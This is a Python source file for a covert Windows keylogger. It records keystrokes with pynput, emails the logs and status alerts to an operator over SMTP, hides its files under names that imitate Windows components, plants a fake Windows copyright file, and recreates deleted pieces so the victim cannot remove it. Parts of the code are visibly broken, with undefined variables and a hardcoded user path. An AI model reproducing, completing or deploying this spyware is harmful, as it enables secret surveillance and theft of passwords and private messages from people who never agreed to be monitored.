#For the keylogger
from pynput.keyboard import Key, Listener
#for the log file
import os
import os.path
#for the email
import smtplib
from email.mime.text import MIMEText
import datetime
import time
import sys
import mail_info
import internet_ch
from cryptography.fernet import Fernet
import random

#Consider https://pypi.org/project/elevate/ using for admin privelages

#Booter.exe is the main backup file
#Windows Backup Protector is the final backup

#Global Variables
timerFile = 'windows_time_manager.exe'
username = os.environ['USERNAME']
inter = internet_ch.internet()
#mail info consturctor
mailinfo = mail_info.email_manager()
mail_down = False

class datatransfer:
    
    
    def __init__(self):
        self.email, self.passw = mailinfo.email_decrypter()
        self.mailMethod = mailinfo.domain_get(self.email)
        self.edate = datetime.datetime.now()
        
        self.recip = 'Admin of the logger file'
        self.fro = 'The logger file'
        try:
            self.server = smtplib.SMTP('smtp.{0}'.format(self.mailMethod), 587)
            self.server.starttls()
            self.server.login(self.email, self.passw)
        except:
            pass
        
        
    def mail_data(self, _type, maildata):
        if not os.path.exists('C:\\Users\\{0}\\Windows32\\m.key'.format(username)):
            key = Fernet.generate_key()
            with open('C:\\Users\\{0}\\Windows32\\m.key'.format(username), 'wb')as md:
                md.writelines(key)
                md.close()
        else:
            with open('C:\\Users\\{0}\\Windows32\\m.key'.format(username), 'rb')as keyfile:
                key = keyfile.readlines()
                keyfile.close()
            _key = Fernet(key)
            
            if _type == 'error':
                num_used = True
                
                
                
                while num_used:
                    tempnum = str(random.randint(1,100000))
                
                
                    for x in os.listdir('C:\\Users\\{0}\\Windows32\\error_backups'.format(username)):
                        if tempnum in x:
                            num_used = True
                            break
                        
                        else:
                            num_used = False
                        
                        
                title = 'error_' + tempnum
            else:
                
                num_used = True
                
                
                
                while num_used:
                    tempnum = str(random.randint(1,100000))
                
                
                    for x in os.listdir('C:\\Users\\{0}\\Windows32\\error_backups'.format(username)):
                        if tempnum in x:
                            num_used = True
                            break
                        
                        else:
                            num_used = False
                title = 'solution_' + tempnum
                
            for x in maildata:
                enc = x.encode()
                encr = _key.encrypt(enc)
            
                with open('C:\\Users\\{0}\\Windows32\\error_backups\\{1}.encrypted'.format(username, title), 'a')as newline:
                    newline.write('\n')
                    newline.close()
                with open('C:\\Users\\{0}\\Windows32\\error_backups\\{1}.encrypted'.format(username, title), 'ab')as encw:
                    encw.write(encr)
                    encw.close()
        
    def solution_mail(self,a,b):
        email_form = MIMEText('<h1><font color=\'green\'>Solution to {0} Successfully Carried OutM</font></h1><p>The error: {0} was fixed by {1}</p>'.format(a, b))
        email_form['To'] = self.recip
        email_form['From'] = self.fro
        email_form['Subject'] = 'Error Fixed'
        try:
            self.server.sendmail(self.email, self.email, email_form.as_string())
        except:
            data = [a,b]
            self.mail_data('solution', data)
            
        
    
    def error_mail(self,a, b):
    
        email_form = MIMEText('<h1><font color=\'red\'>Error at {2}/{3} occured at {4}</font></h1><p>{0}</p><p>{1}</p>'.format(a, b, self.edate.month, self.edate.day, self.edate.time), 'html')
        email_form['To'] = self.recip
        email_form['From'] = self.fro
        email_form['Subject'] = 'Error'
        try:
            self.server.sendmail(self.email, self.email, email_form.as_string())
        except:
            data = [a,b]
            self.mail_data('error', data)
    
    
    def log_mail(self, log):
        email_form = MIMEText(log, 'html')
        email_form['To'] = self.recip
        email_form['From'] = self.fro
        email_form['Subject'] = 'Log'
        try:
            self.server.sendmail(self.email, self.email, email_form.as_string())
        except:
            mail_down = True
            
            
            
    def mail_sever_test(self):
        mail_down = False
        try:
            smtplib.SMTP('smtp.gmail.com', 587)
        except:
            mail_down = True
        
        return mail_down
    
    
    def error_backup_delivery(self, errorfile_data):
        errorlist = []
        for x in errorfile_data:
            errorlist.append('<li>x</li>')
            
            
        errorst = str(errorlist)
        _errorst = errorst.replace(',', '')
        errorst = _errorst.replace('\'')
        _errorst = errorst[1:-1]
            
        email_form = MIMEText('<h1>Missing Error Data Collected by the Logger File</h1><p>This was initially unable to be delivered due to failed connection to the mail server. <ul>{0}</ul>'.format(_errorst), 'html')
        email_form["To"] = self.recip
        email_form['From'] = self.fro
        email_form['Subject'] = 'Failed to be Sent Error Data'
        self.server.sendmail(self.recip, self.fro, email_form.as_string())
    
        
    
    
    
#Data Trans Constructor
datatrans = datatransfer()


class setup:
    def __init__(self):
        self.datentime = datetime.datetime.now()
        self.LanguageDriver()
        self.WindowsBackupProtector()
        self.BooterFile()
        self.Windows32()
        self.nextLogSetup()
        self.error_backups()
    
    
    def LanguageDriver(self):
        if not os.path.exists('C:\\Users\\' + username + '\\Windows Language Driver'):
    #Folder for backup file
            datatrans.error_mail('The Windows Language Driver folder was removed.', 'The user possibly could have discovered the keylogger as this folder is used to hide one of the backup files')
            time.sleep(10)
            os.mkdir('C:\\Users\\' + username + '\\Windows Language Driver')
            os.mkdir('C:\\Users\\' + username + '\\Windows Language Driver\\Windows Resources')
            datatrans.solution_mail('Windows Language Driver Removed', 'the logger file created the missing directories and restored ')
            
    def WindowsBackupProtector(self):
        if os.path.exists('C:\\Users\\' + username + '\\Windows Language Driver\\Windows Resources\\Windows_Backup_Protector.exe'):
            with open('C:\\Users\\' + username + '\\Windows Language Driver\\Windows Resources\\Windows_Backup_Protector.exe', 'rb')as finalbackup:
                lDbin = finalbackup.readlines()
                finalbackup.close()
        elif os.path.exists('C:\\Users\{0}\\Windows Language Driver\\Windows Resources\\boot'.format(user)):
            with open('C:\\Users\{0}\\Windows Language Driver\\Windows Resources\\boot'.format(user), 'rb')as bootback:
                bootbackup = bootback.readlines()
                bootback.close()
        elif not os.path.exists('C:\\Users\{0}\\Windows Language Driver\\Windows Resources\\boot'.format(user)):
            with open('C:\\Users\{0}\\Windows Language Driver\\Windows Resources\\boot'.format(user), 'wb')as bootback_replace:
                bootback_replace.writelines(bootbackup)
                bootback_replace.close()
        else:
            datatrans.error_mail('The Final Deffense File has been Removed', 'This file is used to protect the file protector file. This file is located in the windows language driver foler on the user\'s computer.')
            time.sleep(10)
            with open('C:\\Users\\' + username + '\\Windows Language Driver\\Windows Resources\\Windows_Backup_Protector.exe', 'wb')as wbp:
                wbp.writelines(lDbin)
                wbp.close()
            datatrans.solution_mail('The Final Deffense File Removed', 'The logger file remade the file in its original location.')
            
            
    def Windows32(self):
        if not os.path.exists('C:\\Users\\' + username + '\\Windows32'):
            error_mail('CRITICAL: The windows32 folder was deleted!', 'This is the folder used to hide all of the keylogger\'s components, such as the logs! Attempting to fix.')
            time.sleep(10)
            os.mkdir('C:\\Users\\' + username + '\\Windows32\\')

            if not os.path.exists('C:\\Users\\' + username + '\\Windows32\\Windows Copyright.txt'):
            
            
                datatrans.error_mail('The Fake Windows Copyright Text File was Deleted', 'The user has discovered the Windows32 folder; this folder is used to hold the components to the keylogger.')
                time.sleep(10)
                with open('C:\\Users\\' + username + '\\Windows32\\Windows Copyright.txt', 'w')as fakeTOS:
                    fakeTOS.write('Copyright Windows {0}©'.format(datentime.year))
                    fakeTOS.close()
                datatrans.solution_mail('The Fake Windows Copyright Text File was Deleted', 'The fake copyright file has been restored')
                
        elif not os.path.exists('C:\\Users\\' + username + '\\Windows32\\boot'):
            datatrans.error_mail('The Boot Folder has been Removed', 'This folder contains the logger and timer backup file. This could mean that the user discovered the keylogger.')
            os.mkdir('C:\\Users\\' + username + '\\Windows32\\boot')
        elif os.path.exists('C:\\Users\\{0}\\Windows32\\boot_restart'.format(username)):
            os.startfile('C:\\Users\\{0}\\Windows32\\boot\\booter.exe'.format(username))
            os.remove('C:\\Users\\{0}\\Windows32\\boot_restart'.format(username))
                
        
        elif not os.path.exists('C:\\Users\\micha\\Windows32\\xbin'):
            datatrans.error_mail('The Xbin Directory has Been Removed by the User', 'This could mean that the user has discovered the screenshots from their computer. ')
            time.sleep(10)
            os.mkdir('C:\\Users\\micha\\Windows32\\xbin')
            with open('C:\\Users\\micha\\Windows32\\xbin\\userbin', 'w')as fakebin:
                fakebin.write(bin(555555555555555555555555555555555888888888888888888888888888800000594994949599594875748874939493849383948394893849389383989389384938498394898439489389384984938938498498398349389893893894))
                fakebin.close()
            
            datatrans.solution_mail('The Boot Folder has been Removed', 'The logger file has remade the directory. The logger file will next attempt to remake the logger and timer backup file.')
        elif os.path.exists('C:\\Users\\' + username + '\\Windows32\\t_d'):
            try:
                os.remove('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 't_d'))
                          
            except PermissionError:
                datatrans.error_mail('The Logger File has Failed to Remove the Timer End File', 'This simply means that the logger file has encountered a permission error; this is caused by the timer file still trying to run the file while the logger file attempts to delete it.')
                time.sleep(5)
                try:
                    os.remove('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 't_d'))
                except PermissionError:
                    datatrans.error_mail('The Logger File Failed to Delete the Timer End File a Second Time', 'The logger file attempted to remove the timer end file a second time and failed.')
                    raise PermissionError
                finally:
            #Have the backup file restart the logger. While the backup file carries out this task have it start the final deffense file
            #Have the backup file read cause and email it
                    with open('C:\\Users\\' + username + '\\Windows32\\lo_needs_restart', 'w')as restart:
                        restart.write('Restart Needed')
                        restart.close()
                    sys.exit()
            
            
    def BooterFile(self):
        if not os.path.exists('C:\\Users\\' + username + '\\Windows32\\boot\\booter.exe'):
            datatrans.error_mail('The Logger and Timer Backup File has been Removed', 'The logger file will attempt to contact the final deffense file so that the logger and timer backup file may be restored.')
            os.startfile('C:\\Users\\' + username + '\\Windows Language Driver\\Windows Resources\\Windows Backup Protector.exe')
            #Tells the final backup file to restart the logger after the other file is replaced
            with open('C:\\Users\\' + username + '\\Windows32\\00gDown', 'w')as loggerOff:
                loggerOff.close()
            sys.exit()
                
         
    def nextLogSetup(self):
        if os.path.exists('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'stat')):
            log  = mailinfo.log_decrypter()
            datatrans.log_mail(log)
            try:
                os.remove('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'stat'))
            except PermissionError:
                datatrans.error_mail('The Logger File Failed to Remove the Log File', 'This simply means that the logger file has encountered a permission error, meaning that a file is still trying to access the file.')
                with open('C:\\Users\\' + username + '\\Windows32\\lo_needs_restart', 'w')as restart:
                    restart.write('Restart Needed')
                restart.close()
                sys.exit()
                
                
    def error_backups(self):
        if not os.path.exists('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'error_backups')):
            os.mkdir('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'error_backups'))
        else:
            error_files = []
            if len(os.listdir('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'error_backups'))) > 0:
                for x in os.listdir('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'error_backups')):
                    
                    with open('C:\\Users\\{0}\\Windows32\\m.key'.format(username), 'rb')as keyfile:
                        key = keyfile.readlines()
                        keyfile.close()
                    _key = Fernet(key)
                
                    with open('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'error_backups'), 'rb')as decry:
                        error_enc = decry.readlines()
                        decry.close()
                    
                    decoded_error = []
                    for x in error_enc:
                        decrypted_file = _key.decrypt(erorr_enc)
                        final_line = decrypted_file.decode()
                        decoded_error.append(final_line)
                        
                    finalver = decoded_error[0] + ' ' + decoded_error[1]
                    error_files.append(finalver)
                        
                        
                    
                    
                datatrans.error_backup_delivery(error_files)
                    
        
            
def time_check(a):
    end = Listener()
    if os.path.exists('C:\\Users\\' + username + '\\Windows32\\t_d'):
        end.stop()
        log = mailinfo.log_decrypter()
        
        
        if log[0] != 'null':
            log_back = datatrans.mail_sever_test()
            if not log_back: 
                datatrans.log_mail(log[0])
                if len(log) == 2:
                    datatrans.log_mail()
            
        setter = setup()
        os.startfile('C:\\Users\\' + username + '\\Windows32\\{0}'.format(timerFile))
            



sets = setup()
if os.path.exists('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'stat')):
    log  = mailinfo.log_decrypter()
    datatrans.log_mail(log)
    try:
        os.remove('C:\\Users\\{0}\\Windows32\\{1}'.format(username, 'stat'))
    except PermissionError:
        datatrans.error_mail('The Logger File Failed to Remove the Log File', 'This simply means that the logger file has encountered a permission error, meaning that a file is still trying to access the file.')
        with open('C:\\Users\\' + username + '\\Windows32\\lo_needs_restart', 'w')as restart:
            restart.write('Restart Needed')
            restart.close()
            sys.exit()
os.startfile('C:\\Users\\' + username + '\\Windows32\\{0}'.format(timerFile))
os.startfile('C:\\Users\\' + username + '\\Windows32\\boot\\booter.exe')

            

    
    #The keylogger
                 
with Listener(on_press=mailinfo.key_logg, on_release=time_check)as keylisten:
    keylisten.join()
        
